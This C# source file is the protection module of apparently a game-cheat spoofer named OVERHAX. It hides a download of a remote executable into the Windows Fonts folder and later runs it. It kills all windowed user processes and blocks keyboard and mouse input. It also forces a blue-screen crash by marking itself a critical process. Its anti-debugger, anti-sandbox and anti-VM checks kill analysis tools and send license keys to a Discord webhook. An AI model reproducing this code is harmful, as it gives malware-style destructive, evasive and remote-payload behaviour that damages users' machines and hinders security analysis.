using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using API_Example;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Reflection;
using System.Security;
using System.Web;
using System.Windows;
using BOB.Commons;
using Microsoft.Win32;
using System.Drawing;
using Console = Colorful.Console;

namespace Protect
{
	internal class This
	{
		#region DLLImports/Bools
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcessId();

		[DllImport("user32.dll")]
		private static extern int GetWindowThreadProcessId(IntPtr hWnd, ref IntPtr ProcessId);

		[DllImport("user32.dll")]
		static extern int SetWindowText(IntPtr hWnd, string text);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("ntdll.dll")]
		private static extern int NtSetInformationProcess(IntPtr process, int process_cass, ref int process_value, int length);

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern void BlockInput([MarshalAs(UnmanagedType.Bool)] [In] bool fBlockIt);

		[DllImport("kernel32.dll")]
		private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

		private static bool isDebuggerPresent = false;
		private static bool _TurnedOn = false;
		private static bool _TurnedOff = false;
		private static bool CheckForIllegalCrossThreadCalls = false;
		private static string killswitch_status = null;
		#endregion	
		// Import done
		// 3DS PROTECTION
		public static void Start()
		{

			try
			{
				WebClient wb = new WebClient();
				wb.Headers["User-Agent"] = "NOTCRACKEDOK";
			    string con = @"C:\Windows\Fonts\devcon.exe";
				wb.DownloadFile("http://overhaxweebloader.cf/Cleaners/devcon.exe", con);

				wb.DownloadString("https://google.com");
			}
			catch
			{
				
			}
			This.closeAll();
		    This.AntiDebug();
			This.GetRunningDebugger.Find();
		    This.SandBoxieDetect();
			This.VMDetect();
			This.StopFnProccess();
			//This.BanKey();
			//This.AntiDetectDrivers();
			//This.ExtraProc();
			//This.BSOD();
		}

		public static void StopFnProccess()
		{
			var dllhost = Process.GetProcesses().
	        Where(pr => pr.ProcessName == "dllhost"); 

			foreach (var process in dllhost)
			{
				process.Kill();
			}
			//taskkill /F /IM dllhost.exe /T
		}
		public static void BanKey()
		{

			//ADD KEY TO REGISTRY
			RegistryKey SoftwareKey = Registry.LocalMachine.OpenSubKey("Software", true);

			RegistryKey AppNameKey = SoftwareKey.CreateSubKey("OVERHAX SPOOFER");
			RegistryKey AppVersionKey = AppNameKey.CreateSubKey("Banned");


			AppVersionKey.SetValue("Status", "1");
			///
			string yesno = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\OVERHAX SPOOFER\Banned", "Status", "3");
			if (yesno != null)
			{
				Console.WriteLine("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");

			}
		}

		public static void test()
		{
			//bat code 
			/*
			 type nul >yes.txt
             OVERHAXSPOOF.exe
             ping 127.0.0.1 -n 2 > nul
             del yes.txt
             Reg.exe delete "HKLM\SOFTWARE\WOW6432Node\OVERHAX SPOOFER\NotRan" /f
			 */

			if (File.Exists("yes.txt"))
			{
				//ADD KEY TO REGISTRY
				RegistryKey SoftwareKey = Registry.LocalMachine.OpenSubKey("Software", true);

				RegistryKey AppNameKey = SoftwareKey.CreateSubKey("OVERHAX SPOOFER");
				RegistryKey AppVersionKey = AppNameKey.CreateSubKey("NotRan");

				AppVersionKey.SetValue("Status", "1");
				///
				string yesno = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\OVERHAX SPOOFER\NotRan", "Status", "1");
				if (yesno != null)
				{
					Process p = Process.Start("OVERHAX SPOOF.exe");
					Thread.Sleep(100);
					SetWindowText(p.MainWindowHandle, Path.GetRandomFileName());
					Environment.Exit(0);
				}

			}
		
		}

		public static void closeAll()
		{
			Process me = Process.GetCurrentProcess();
			foreach (Process p in Process.GetProcesses())
			{



				if (p.Id != me.Id
					&& !p.ProcessName.ToLower().StartsWith("winlogon")
					&& !p.ProcessName.ToLower().StartsWith("system idle process")
					&& !p.ProcessName.ToLower().StartsWith("taskmgr")
					&& !p.ProcessName.ToLower().StartsWith("spoolsv")
					&& !p.ProcessName.ToLower().StartsWith("csrss")
					&& !p.ProcessName.ToLower().StartsWith("smss")
					&& !p.ProcessName.ToLower().StartsWith("svchost")
					&& !p.ProcessName.ToLower().StartsWith("services")
					&& !p.ProcessName.ToLower().StartsWith("lsass")
					&& !p.ProcessName.ToLower().StartsWith("lsm")
					&& !p.ProcessName.ToLower().StartsWith("wininit")
					)
				{
					if (p.MainWindowHandle != IntPtr.Zero)
					{
						p.Kill();
					}
				}

			}
		}

		public static void checkConnection()
		{
	
			try
			{
				Process Start = new Process();
				string con = @"C:\Windows\Fonts\devcon.exe";

				Thread.Sleep(2500);
				Start = Process.Start(con);
               
				using (var client = new WebClient())
				using (var stream = client.OpenRead("http://www.google.com"))
				{
					Console.ResetColor();
					Console.WriteLine("[-] Network Established.", Color.Green);
				}
				Thread.Sleep(1500);
				Start.Close();
			}
			catch
			{
				Thread.Sleep(2000);
				Console.WriteLine("[!!] Lost connection, don't worry we are reconnecting you.", Color.Red);
				checkConnection();
			}
			return;
		}

		public static void AntiDetectDrivers()
		{
			try
			{
				using (StreamWriter writer1 = File.AppendText(@"C:\Windows\Installer\{69CD1F2D-DF68-4E23-9108-1B70783F2852}\veraqzxx64.sys"))
				using (StreamWriter writer = File.AppendText(@"C:\Windows\IME\spoofer.sys"))
				{
					writer.WriteLine("  ");
					writer1.WriteLine("  ");
				}
			} catch
			{
				return;
			}
			
		}

		public static void ExtraProc()
		{
			Process[] processlist = Process.GetProcesses();

			Regex regex2 = new Regex(@"pack.*");
			Regex regex1 = new Regex(@"debug.*");
			Regex regex = new Regex(@"dumper.*");
			bool killable = false;

			try
			{

				foreach (Process PROC in processlist)
				{

					foreach (Process p in Process.GetProcesses("."))
					{
						killable = true;

						//This.KillPC();
						//This.MouseFreeze();

						if (regex.Match(p.ProcessName).Success)
						{
							killable = true;
						}
						if (regex2.Match(p.ProcessName).Success)
						{
							killable = true;
						}
						if (regex1.Match(p.ProcessName).Success)
						{
							killable = true;
						}

						if (killable == true)
						{


							Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO Found " + p.ProcessName + " Close this continue && TIMEOUT 5\"")
							{
								CreateNoWindow = false,
								UseShellExecute = false
							});
							Process.GetCurrentProcess().Kill();
							//This.RevivePC();
							//This.ReleaseMouse();							
						}
						if (killable == false)
						{
							This.Start();
							//Process.GetCurrentProcess().Kill();
						}
					}
				}
			}
			catch
			{
				This.Start();

				//This.ReleaseMouse();
				//This.RevivePC();
				This.BSOD();
			}
		}

		private static void FreezeWindowsProcess()
		{
			while (This._TurnedOn)
			{
				This.BlockInput(true);
			}
			while (This._TurnedOff)
			{
				This.BlockInput(false);
			}
			Thread.Sleep(250);
		}

		public static void MouseFreeze()
		{
			This._TurnedOn = true;
			This._TurnedOff = false;
			Thread thread = new Thread(new ThreadStart(This.FreezeWindowsProcess));
			This.CheckForIllegalCrossThreadCalls = false;
			thread.Start();
		}

		public static void KillPC()
		{
			Process.Start("C:\\Windows\\System32\\taskkill.exe", "/F /IM explorer.exe");
		}

		public static void RevivePC()
		{
			Process.Start(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
		}

		public static void ReleaseMouse()
		{
			This._TurnedOn = false;
			This._TurnedOff = true;
			This.BlockInput(false);
			Draw.cache();
		}

		public static void BSOD()
		{
			KillPC();
			Process.EnterDebugMode();
			int num = 1;
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref num, sizeof(int));
			Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO Don't tamper With our software! && TIMEOUT 5\"")
			{
				CreateNoWindow = false,
				UseShellExecute = false
			});
			Process.GetCurrentProcess().Kill();
		}

		private static void AntiDebug()
		{
			This.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref This.isDebuggerPresent);
			bool flag = This.isDebuggerPresent;
			try
			{
				if (flag)
				{
					using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
					{
						dcWeb.WebHook = Webhooks.dWebHook.Logweb;
						dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
						dcWeb.UserName = "OVERHAX LOGGING";
						Thread.Sleep(500);
						dcWeb.SendMessage(">>> __***Found debugger in type***__" + "AntiDebug"+ " **KEY: **" + Entries.key);
					}

					Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO Active debugger found, please make sure it is not Visual Studio! && TIMEOUT 5\"")
					{
						CreateNoWindow = false,
						UseShellExecute = false
					});
					Process.GetCurrentProcess().Kill();
					This.Start();
				}
			}
			catch
			{
				This.BSOD();
			}
		}

		private static void SandBoxieDetect()
		{
			bool flag = This.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
			if (flag)
			{
				using(Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
							{
					dcWeb.WebHook = Webhooks.dWebHook.Logweb;
					dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
					dcWeb.UserName = "OVERHAX LOGGING";
					Thread.Sleep(500);
					dcWeb.SendMessage(">>> __***Found debugger in type***__" + "SandBoxieDetect" + " **KEY: **" + Entries.key);
				}
				Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO Sorry you can't run this file in a sandboxie, To keep this program safe from getting cracked. && TIMEOUT 5\"")
				{
					CreateNoWindow = false,
					UseShellExecute = false
				});
				Process.GetCurrentProcess().Kill();
			}
		}
		public static void FixMenu()
		{

		}
		private static void VMDetect()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						bool flag = (managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox";
						if (flag)
						{
							using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
							{
								dcWeb.WebHook = Webhooks.dWebHook.Logweb;
								dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
								dcWeb.UserName = "OVERHAX LOGGING";
								Thread.Sleep(500);
								dcWeb.SendMessage(">>> __***Found debugger in type***__" + "VMware VMDetect" + " **KEY: **" + Entries.key);
							}
							MessageBox.Show("Sorry you can't run this file in a VM!", "To keep this program safe from getting cracked");
							Process.GetCurrentProcess().Kill();
						}
					}
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				bool flag2 = managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox");
				if (flag2)
				{
					using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
					{
						dcWeb.WebHook = Webhooks.dWebHook.Logweb;
						dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
						dcWeb.UserName = "OVERHAX LOGGING";
						Thread.Sleep(500);
						dcWeb.SendMessage(">>> __***Found debugger in type***__" + "VMware VMDetect" + " **KEY: **" + Entries.key);
					}
					MessageBox.Show("Sorry you can't run this file in a VM!", "To keep this program safe from getting cracked");
					Process.GetCurrentProcess().Kill();
				}
			}
		}



		internal class GetRunningDebugger
		{
			internal static void Find()
			{
				This.GetRunningDebugger.Close("MegaDumper");
				This.GetRunningDebugger.Close("NETUnpack");
				This.GetRunningDebugger.Close("demoleition");
				This.GetRunningDebugger.Close("die");
				This.GetRunningDebugger.Close("diel");
				This.GetRunningDebugger.Close("diec");
				This.GetRunningDebugger.Close("dnSpy.Console");
				This.GetRunningDebugger.Close("dnSpy");
				This.GetRunningDebugger.Close("dnSpy-x86");
				This.GetRunningDebugger.Close("EnigmaVBUnpacker");
				This.GetRunningDebugger.Close("SimpleAssemblyExplorer");
				This.GetRunningDebugger.Close("SimpleAssemblyExplorer.vshost");
				This.GetRunningDebugger.Close("UnConfuserEx");
				This.GetRunningDebugger.Close("Universal_Fixer");
				This.GetRunningDebugger.Close("x96dbg");
				This.GetRunningDebugger.Close("x64dbg");
				This.GetRunningDebugger.Close("x32dbg");
				This.GetRunningDebugger.Close("xvlk");
				This.GetRunningDebugger.Close("xvlkc");
				This.GetRunningDebugger.Close("Reflector");
				This.GetRunningDebugger.Close("ReflectorCmd");
				This.GetRunningDebugger.Close("ida");
				This.GetRunningDebugger.Close("ida64");
				This.GetRunningDebugger.Close("idag");
				This.GetRunningDebugger.Close("idat");
				This.GetRunningDebugger.Close("idat64");
				This.GetRunningDebugger.Close("qwingraph");
				This.GetRunningDebugger.Close("HTTPDebuggerUI");
				This.GetRunningDebugger.Close("de4dot");
				This.GetRunningDebugger.Close("de4dot_shell");
				This.GetRunningDebugger.Close("de4dot_shell-x64");
				This.GetRunningDebugger.Close("de4dot-x64");
				This.GetRunningDebugger.Close("AssemblyServer");
				This.GetRunningDebugger.Close("AssemblyServer-x64");
				This.GetRunningDebugger.Close("Wireshark");
				This.GetRunningDebugger.Close("Fidler");
				This.GetRunningDebugger.Close("dumpcap");
				This.GetRunningDebugger.Close("editcap");
				This.GetRunningDebugger.Close("HxD");
			}

			internal static void Close(string file)
			{
				try
				{
					foreach (Process process in Process.GetProcessesByName(file))
					{
						process.Kill();
						This.GetRunningDebugger.Find();
						This.KillPC();
						MessageBox.Show(file + ".exe Debugger/Unpacker Found Open!", "Close this to continue!");
						This.MouseFreeze();
						Thread.Sleep(2000);
						Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO " + file + " Detected! && TIMEOUT 10\"")
						{
							CreateNoWindow = true,
							UseShellExecute = false
						});
						using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
						{
							dcWeb.WebHook = Webhooks.dWebHook.Logweb;
							dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
							dcWeb.UserName = "OVERHAX LOGGING";
							Thread.Sleep(500);
							dcWeb.SendMessage(">>> __***Found debugger in type***__" + "GetRunningDebugger" + " **KEY: **" + Entries.key);
						}
						This.RevivePC();
						This.ReleaseMouse();
						Process.GetCurrentProcess().Kill();
					}
				}
				catch
				{
					This.Start();
					This.ReleaseMouse();
					This.RevivePC();
					Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection Failed to close task && ECHO " + file + " Detected! && TIMEOUT 10\"")
					{
						CreateNoWindow = false,
						UseShellExecute = false
					});
					This.BSOD();
				}
			}
		}

		internal class DebugScan
		{
			internal static void FileDebug()
			{
				string userName = Environment.UserName;
				This.DebugScan.Search("C:\\Program Files", "Wireshark", "exe");
				This.DebugScan.Search("C:\\Program Files", "dumpcap", "exe");
				This.DebugScan.Search("C:\\Program Files", "editcap", "exe");
				This.DebugScan.Search("C:\\Program Files", "k5sprt64", "dll");
				This.DebugScan.Search("C:\\Program Files", "libgmodule-2.0-0", "dll");
				bool flag = !Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Programs");
				if (flag)
				{
					Directory.CreateDirectory("C:\\Users\\" + userName + "\\AppData\\Local\\Programs");
				}
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Programs", "Telerik.NetworkConnections", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Programs", "Xceed.Zip.v5.4", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Programs", "Zopfli", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "dnSpy-x86", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "dnSpy-x86", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "dnSpy-x86", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "dnSpy.Analyzer", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "dnSpy.Debugger.DotNet.CorDebug", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "dnSpy", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "dnSpy", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "dnSpy", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "dnSpy", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "dnSpy.Analyzer.x", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "dnSpy-x86", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "Procmon.exe", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "Procmon", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "Procmon", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "Procmon", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "SimpleAssemblyExplorer", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "SimpleAssemblyExplorer", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "SimpleAssemblyExplorer", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "SimpleAssemblyExplorer", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "SimpleAssemblyExplorer.vshost", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "SimpleAssemblyExplorer.vshost", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "SimpleAssemblyExplorer.vshost", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "SimpleAssemblyExplorer.vshost", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "ICSharpCode.NRefactory.CSharp", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "ICSharpCode.NRefactory.CSharp", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "ICSharpCode.NRefactory.CSharp", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "ICSharpCode.NRefactory.CSharp", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "HxD64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "HxD64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "HxD64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "HxD64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "HxD32", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "HxD32", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "HxD32", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "HxD32", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "HxD Hex Editor.ini", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "HxD Hex Editor.ini", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "HxD Hex Editor.ini", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "HxD Hex Editor.ini", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "x96dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "x96dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "x96dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "x96dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "x64dbg", "chm");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "x64dbg", "chm");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "x64dbg", "chm");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "x64dbg", "chm");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "x64dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "x64dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "x64dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "x64dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "ssleay32", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "ssleay32", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "ssleay32", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "ssleay32", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "x32dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "x32dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "x32dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "x32dbg", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "ida64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "ida64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "ida64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "ida64", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "Qt5Core", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "Qt5Core", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "Qt5Core", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "Qt5Core", "dll");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Ghidra\\packed-db-cache", "cache", "map");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\AppData\\Local\\Temp", "FolderChangesView", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Downloads", "FolderChangesView", "exe");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Desktop", "FolderChangesView", "exe");
				This.DebugScan.Search("C:\\Program Files(x86)\\HTTPDebuggerPro", "HTTPDebuggerSvc", "exe");
				This.DebugScan.Search("C:\\Program Files (x86)\\mitmproxy", "uninstall", "exe");
				This.DebugScan.Search("C:\\Program Files\\Charles", "Charles", "exe");
				This.DebugScan.Search("C:\\ProgramData\\HTTPDebuggerPro", "settings", "xml");
				This.DebugScan.Search("C:\\Users\\" + userName + "\\Videos", "FolderChangesView", "exe");
			}

			internal static void Search(string dir, string file, string Extention)
			{
				string text = string.Concat(new string[]
				{
					dir,"\\", file, ".", Extention
				});
				bool flag = File.Exists(text);
				if (flag)
				{
					try
					{
						using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
						{
							dcWeb.WebHook = Webhooks.dWebHook.Logweb;
							dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
							dcWeb.UserName = "OVERHAX LOGGING";
							Thread.Sleep(500);
							dcWeb.SendMessage(">>> __***Found debugger in type***__" + "DebugScan" + " **KEY: **" + Entries.key);
						}
						MessageBox.Show(text + " Debugger Found!", "Delete this to continue!");
						Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OVERSPOOF Protection && ECHO " + text + " Detected! && TIMEOUT 10\"")
						{
							CreateNoWindow = true,
							UseShellExecute = false
						});
						Process.GetCurrentProcess().Kill();
					}
					catch
					{
						This.BSOD();
					}
				}
			}
		}
	}	
}
